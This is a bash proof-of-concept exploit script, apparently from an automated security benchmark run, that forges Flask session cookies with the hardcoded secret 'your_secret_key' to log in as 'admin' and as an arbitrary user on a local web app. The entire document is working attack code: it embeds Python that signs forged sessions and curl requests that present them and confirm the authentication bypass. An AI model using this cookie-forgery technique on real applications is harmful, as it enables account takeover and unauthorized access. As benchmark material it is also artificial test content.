#!/bin/bash
# POC: Demonstrates session cookie forgery using the weak hardcoded Flask secret key to bypass authentication and access protected resources as any user including admin
# Target: ./repo
# Created: 2025-10-31T16:58:08.644Z
# Session: benchmark-XBEN-032-24-mhf2utzd

echo "=================================="
echo "Session Forgery POC - Weak Secret Key"
echo "=================================="
echo ""

TARGET="http://localhost:8080"

echo "[*] Step 1: Attempting to access /dashboard without authentication"
echo "Command: curl -s -o /dev/null -w '%{http_code}' $TARGET/dashboard"
RESPONSE_CODE=$(curl -s -o /dev/null -w '%{http_code}' $TARGET/dashboard)
echo "Response Code: $RESPONSE_CODE"
echo ""

if [ "$RESPONSE_CODE" == "302" ] || [ "$RESPONSE_CODE" == "401" ] || [ "$RESPONSE_CODE" == "403" ]; then
    echo "[✓] Dashboard requires authentication (as expected)"
else
    echo "[!] Unexpected response code: $RESPONSE_CODE"
fi
echo ""

echo "[*] Step 2: Forging admin session cookie using weak secret key 'your_secret_key'"
echo ""

# Create a Python script to forge the session cookie
FORGE_SCRIPT=$(cat <<'EOF'
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # Weak hardcoded secret

session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
forged_cookie = session_serializer.dumps({'username': 'admin'})
print(forged_cookie)
EOF
)

echo "Python code:"
echo "$FORGE_SCRIPT"
echo ""

FORGED_COOKIE=$(python3 -c "$FORGE_SCRIPT" 2>&1)

if [ $? -eq 0 ]; then
    echo "[✓] Successfully forged session cookie"
    echo "Forged cookie: $FORGED_COOKIE"
else
    echo "[✗] Failed to forge cookie. Error: $FORGED_COOKIE"
    exit 1
fi
echo ""

echo "[*] Step 3: Accessing /dashboard with forged admin session cookie"
echo "Command: curl -s -i $TARGET/dashboard -H 'Cookie: session=$FORGED_COOKIE'"
echo ""

RESPONSE=$(curl -s -i "$TARGET/dashboard" -H "Cookie: session=$FORGED_COOKIE")
echo "$RESPONSE"
echo ""

# Check if we successfully bypassed authentication
if echo "$RESPONSE" | grep -q "HTTP/.*200"; then
    echo "[✓] SUCCESS: HTTP 200 OK received"
    
    if echo "$RESPONSE" | grep -q "admin"; then
        echo "[✓] CRITICAL: Successfully accessed dashboard as 'admin' without credentials"
        echo "[✓] Authentication bypass confirmed!"
    else
        echo "[!] Got 200 OK but username not visible in response"
    fi
else
    echo "[✗] FAILED: Did not receive HTTP 200 OK"
    echo "[!] The vulnerability may not be exploitable or the application structure differs"
fi
echo ""

echo "[*] Step 4: Testing with arbitrary username 'hacker123'"
FORGE_SCRIPT_2=$(cat <<'EOF'
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = 'your_secret_key'

session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
forged_cookie = session_serializer.dumps({'username': 'hacker123'})
print(forged_cookie)
EOF
)

FORGED_COOKIE_2=$(python3 -c "$FORGE_SCRIPT_2" 2>&1)
echo "Forged cookie for 'hacker123': $FORGED_COOKIE_2"
echo ""

RESPONSE_2=$(curl -s "$TARGET/dashboard" -H "Cookie: session=$FORGED_COOKIE_2")
echo "Response excerpt: $(echo "$RESPONSE_2" | grep -o 'Welcome, [^<]*' | head -1)"
echo ""

if echo "$RESPONSE_2" | grep -q "hacker123"; then
    echo "[✓] Successfully forged session for arbitrary username 'hacker123'"
    echo "[✓] Complete authentication bypass confirmed for any username"
else
    echo "[!] Could not confirm arbitrary username forgery"
fi
echo ""

echo "=================================="
echo "POC Complete"
echo "=================================="
echo ""
echo "Summary:"
echo "- Weak secret key: 'your_secret_key'"
echo "- Successfully forged session cookies for admin and arbitrary users"
echo "- Bypassed authentication without valid credentials"
echo "- CRITICAL vulnerability confirmed"